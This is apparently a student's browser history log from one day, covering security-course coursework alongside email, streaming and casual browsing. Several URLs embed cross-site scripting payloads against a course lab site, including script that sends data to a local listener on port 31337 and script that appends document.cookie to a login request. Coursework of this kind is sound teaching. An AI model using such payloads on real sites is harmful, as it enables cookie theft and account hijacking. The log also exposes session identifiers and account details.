2/16/2015,https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=construct%20string%20without%20quotes
2/16/2015,https://ctools.umich.edu/portal/tool/0c9366ad-5718-4d4f-9559-d9cd129660f3?assignmentId=/assignment/a/7aa79a5e-6628-4675-b8b1-bd1fbe338c3f/82e645ca-8c37-452d-9436-8f9608d75c80&submissionId=/assignment/s/7aa79a5e-6628-4675-b8b1-bd1fbe338c3f/82e645ca-8c37-452d-9436-8f9608d75c80/e823fe83-41e5-4a35-928b-d62a9018ab94&panel=Main&sakai_action=doGrade_submission
2/16/2015,file:///Users/luis/Downloads/submit/xss_payload.html
2/16/2015,https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=regular%20expression%20javascript
2/16/2015,https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions
2/16/2015,https://mail.google.com/mail/u/0/#inbox/14b8518de8aed0a0?compose=14b88a5a7f466e93%2C14b8a011ef97574f
2/16/2015,https://mail.google.com/mail/u/0/#inbox/14b948a7a99cc545?compose=14b88a5a7f466e93%2C14b8a011ef97574f
2/16/2015,https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=encodeuricomponent
2/16/2015,https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI
2/16/2015,https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent
2/16/2015,https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=get%20input%20value%20jquery
2/16/2015,https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=set+input+value+jquery
2/16/2015,"https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CB4QFjAA&url=http%3A%2F%2Fapi.jquery.com%2Fval%2F&ei=r4TiVK7FE6rpywPx4YDgDw&usg=AFQjCNH-GtfNf_4YLXDtVLm7PPh0POeseA&sig2=yEUZKKMcuKhWqQnOhWdvrQ&bvm=bv.85970519,d.bGQ&cad=rja"
2/16/2015,http://api.jquery.com/val/
2/16/2015,https://blog.udemy.com/jquery-set-value/
2/16/2015,"https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=5&ved=0CDwQFjAE&url=https%3A%2F%2Fblog.udemy.com%2Fjquery-set-value%2F&ei=r4TiVK7FE6rpywPx4YDgDw&usg=AFQjCNHBENE1UK6OfhQXi3MHz4T3iesSUg&sig2=y92p0vSBk3FM7RAI-tSc1w&bvm=bv.85970519,d.bGQ&cad=rja"
2/16/2015,http://eecs388.org/project2/search?q=hlkjgjhk
2/16/2015,https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=jquery%20get
2/16/2015,http://api.jquery.com/jquery.get/
2/16/2015,http://www.sigops.org/sosp/sosp09/papers/isard-sosp09.pdf
2/16/2015,http://www.netflix.com/WiPlayer?movieid=70296535&trkid=13462100&tctx=-99%2C-99%2Ca4299321-c763-4a5d-8daf-9a42af128e85-45536115
2/16/2015,https://mail.google.com/mail/u/0/#inbox/14b94d5d86e43ddd?compose=14b88a5a7f466e93%2C14b8a011ef97574f
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3E%24.get%28+%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22%2C+%7B+user%3A+%22luis%22%2C+time%3A+%222pm%22+%7D+%29%3B%3C%2Fscript%3E
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3Efunction%20fn()%20{%20alert(0);%20}%20fn()%3C%2Fscript%3E
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3Efunction%20fn()%20{%20alert(0);%20};%20fn()%3C%2Fscript%3E
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3Efunction%20fn()%20{%20alert(0);%20}\nfn()%3C%2Fscript%3E
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3Efunction%20()%20%7B%20alert(0)%3B%20%7D%0Afn())%3C%2Fscript%3E
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3Efunction%20()%20%7B%20alert(0)%3B%20%7D%0Afn()%3C%2Fscript%3E
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3Efunction%20fn()%20%7B%20alert(0)%3B%20%7D%0Afn()%3C%2Fscript%3E
2/16/2015,http://eecs388.org/project2/search?q=function%20example()%20%7B%0A%20%20%20%20%20%20%20%20alert(0)%0A%20%20%20%20%20%20%20%20alert(1)%0A%20%20%20%20%7D%20example()
2/16/2015,http://eecs388.org/project2/search?q=function%20example()%20%7B%0A%20%20%20%20%20%20%20%20alert(0)%0A%20%20%20%20%20%20%20%20alert(1)%0A%20%20%20%20%7D%0Aexample()
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3Efunction%20example()%20%7B%0A%20%20%20%20%20%20%20%20alert(0)%0A%20%20%20%20%20%20%20%20alert(1)%0A%20%20%20%20%7D%0Aexample()%3C/script%3E
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3Efunction%20example()%20%7B%0A%20%20%20%20%20%20%20%20alert(0)%0A%20%20%20%20%20%20%20%20alert(1)%0A%20%20%20%20%7D%0Aexample()%3C%2Fscript%3E
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3Evar+url+%3D+%22http%3A%2F%2Feecs388.org%2Fproject2%2Flogin%3Fusername%3D%2522victim%2522%26password%3D%2522hasd%2522%26csrf_token%3D%22%3B+url+%2B+document.cookie%3B+%2B+%24.post%28url%29%3B%3C%2Fscript%3E
2/16/2015,https://mail.google.com/mail/u/0/#inbox/14b951d2982bf2dd?compose=14b88a5a7f466e93%2C14b8a011ef97574f&projector=1
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3E+function%2520example%28%29%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520var%2520re%2520%253D%2520%252Fexample%252F%250A%2520%2520%2520%2520%2520%2520%2520%2520alert%280%29%250A%2520%2520%2520%2520%2520%2520%2520%2520alert%28re.toString%28%29%29%250A%2520%2520%2520%2520%257D%250Aexample%28%29%3C%2Fscript%3E
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3E+function%2520example%28%29%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520var%2520re%2520%253D%2520%252Fexample%252F%250A%2520%2520%2520%2520%2520%2520%2520%2520alert%280%29%250A%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520alert%28re.toString%28%29%29%250A%2520%2520%2520%2520%257D%250Aexample%28%29%3C%2Fscript%3E
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3Efunction%20example()%20%7B%0A%20%20%20%20%20%20%20%20%2F%2F%20var%20re%20%3D%20%2Fexample%2F%0A%20%20%20%20%20%20%20%20alert(0)%0A%20%20%20%20%20%20%20%20%2F%2F%20alert(re.toString())%0A%20%20%20%20%7D%0Aexample()%3C%2Fscript%3E
2/16/2015,file:///Users/luis/dev/um/eecs388/p2/example.html
2/16/2015,http://eecs388.org/project2/search?q=%3Cscript%3Efunction%20example()%20%7B%0A%20%20%20%20%20%20%20%20var%20re%20%3D%20%2Fexample%2F%0A%20%20%20%20%20%20%20%20alert(0)%0A%20%20%20%20%20%20%20%20alert(re.toString())%0A%20%20%20%20%7D%0Aexample()%3C%2Fscript%3E
2/16/2015,http://www.netflix.com/WiPlayer?movieid=70296535&trkid=13462100&tctx=-99%2C-99%2Ca4299321-c763-4a5d-8daf-9a42af128e85-45536115#episodeId=70296536&trackId=13589538
2/16/2015,http://www.netflix.com/WiPlayer?movieid=70296535&trkid=13462100&tctx=-99%2C-99%2Ca4299321-c763-4a5d-8daf-9a42af128e85-45536115#episodeId=70296536
2/16/2015,https://mail.google.com/mail/u/0/#inbox/14b942885ff6f9b3?compose=14b88a5a7f466e93%2C14b8a011ef97574f
2/16/2015,https://ctools.umich.edu/access/content/group/7aa79a5e-6628-4675-b8b1-bd1fbe338c3f/Discussion%20notes/EECS%20388%20Discussion%205.pdf
2/16/2015,file:///Users/luis/dev/um/eecs388/p2/csrf_0.html
2/16/2015,file:///Users/luis/dev/um/eecs388/p2/project2/csrf_0.html
2/16/2015,http://eecs388.org/project2/login
2/16/2015,http://eecs388.org/project2/logout
2/16/2015,file:///Users/luis/dev/um/eecs388/p2/dis.html
2/16/2015,https://mail.google.com/mail/u/0/#inbox/14b950986f577cfd?compose=14b88a5a7f466e93%2C14b8a011ef97574f
2/16/2015,https://mail.google.com/mail/u/0/#inbox/14b94dfa29360614?compose=14b88a5a7f466e93%2C14b8a011ef97574f
2/16/2015,https://mail.google.com/mail/u/0/#inbox/14b951d2982bf2dd?compose=14b88a5a7f466e93%2C14b8a011ef97574f
2/16/2015,https://mail.google.com/mail/u/0/#inbox/14b955fbe478380b?compose=14b88a5a7f466e93%2C14b8a011ef97574f
2/16/2015,https://mail.google.com/mail/u/0/#inbox/14b9564f66c346d2?compose=14b88a5a7f466e93%2C14b8a011ef97574f
2/16/2015,https://mail.google.com/mail/u/1/#inbox/14b94c7188c5b629
2/16/2015,https://ows01.hireright.com/applicant_center/entry?key=6B3A1DAFAF6521A37B6592AB1A0D41B9
2/16/2015,https://ows01.hireright.com/applicant_center/0.do;jsessionid=824512C30B8624FFDE052971AB9A4897?event=temporary_entry_point&create=true&key=6B3A1DAFAF6521A37B6592AB1A0D41B9
2/16/2015,https://ows01.hireright.com/ac.html?key=6B3A1DAFAF6521A37B6592AB1A0D41B9
2/16/2015,https://ows01.hireright.com/applicant_center/1.do;jsessionid=824512C30B8624FFDE052971AB9A4897
2/16/2015,https://ows01.hireright.com/applicant_center/3.do;jsessionid=824512C30B8624FFDE052971AB9A4897?event=applicant_portal_status&parId=824512C30B8624FFDE052971AB9A48970
2/16/2015,https://ows01.hireright.com/applicant_center/3.do;jsessionid=824512C30B8624FFDE052971AB9A4897?event=applicant_portal_status&parId=824512C30B8624FFDE052971AB9A48970#
2/16/2015,https://ows01.hireright.com/applicant_center/24.do;jsessionid=824512C30B8624FFDE052971AB9A4897?event=applicant_portal_status
2/16/2015,https://ows01.hireright.com/applicant_center/24.do;jsessionid=824512C30B8624FFDE052971AB9A4897?event=applicant_portal_status#
2/16/2015,https://ows01.hireright.com/applicant_center/43.do;jsessionid=824512C30B8624FFDE052971AB9A4897?event=applicant_portal_status&resetCache=true
2/16/2015,https://ows01.hireright.com/applicant_center/43.do;jsessionid=824512C30B8624FFDE052971AB9A4897?event=applicant_portal_status&resetCache=true#
2/16/2015,https://mail.google.com/mail/u/1/#inbox/14b95139ab1320f6
2/16/2015,https://mail.google.com/mail/u/1/#inbox/14b94af8f325e931
2/16/2015,https://mail.google.com/mail/u/1/#inbox/14b94b63e873a0c8
2/16/2015,https://mail.google.com/mail/u/1/#inbox/14b94b0a57533e88
2/16/2015,http://www.stumbleupon.com/su/2BodeL/88jK99Vi:1RQAFSEg/news.buzzbuzzhome.com/2015/02/home-design-fails.html
2/16/2015,http://www.netflix.com/WiPlayer?movieid=70296535&trkid=13462100&tctx=-99%2C-99%2Ca4299321-c763-4a5d-8daf-9a42af128e85-45536115#trackId=13589538&episodeId=70296537
2/16/2015,http://www.stumbleupon.com/su/2hev3s/LcJhSKmX:1RQAFSEg/allthingslinguistic.com/post/93815165446/a-linguist-walks-into-a-bar
2/16/2015,http://www.stumbleupon.com/su/1BIXyL/Y+-.lV$M:1RQAFSEg/ithinkmymomscrazy.com/will-valentine
2/16/2015,http://www.stumbleupon.com/su/1BIXyL/Y+-.lV$M:1RQAFSEg/ithinkmymomscrazy.com/will-valentine/
2/16/2015,http://www.stumbleupon.com/su/1fxB0G/mSbK.hDB:1RQAFSEg/www.buzzfeed.com/h1/suad/pgvicks/real-things-you-wish-you-could-say-to-your-cold
2/16/2015,http://www.stumbleupon.com/su/9I98Dy/16Is+Z$kw:1RQAFSEg/www.dribbleglass.com/subpages/crayons.htm
2/16/2015,http://www.stumbleupon.com/su/3156uJ/zwBiGsU0:1RQAFSEg/www.buzzfeed.com/ashleyperez/epic-fails-that-will-make-you-feel-better-about-yourself?sub=3251934_2959646
2/16/2015,https://mail.google.com/mail/u/0/#inbox/14b93d26896cabd0?compose=14b88a5a7f466e93%2C14b8a011ef97574f
2/16/2015,https://mail.google.com/mail/u/1/#inbox/14b931e10e01c5c4
2/16/2015,https://mail.google.com/mail/u/1/#inbox/14b85434083b1d8b
2/16/2015,https://www.dropbox.com/sh/278qyhuokj6s4zv/AAAf8ygMGDS--zFDjOujqTdPa/Fondo%20Blanco?dl=0#lh:null-Studio%20Session-016(Cafe2)%20copy.jpg
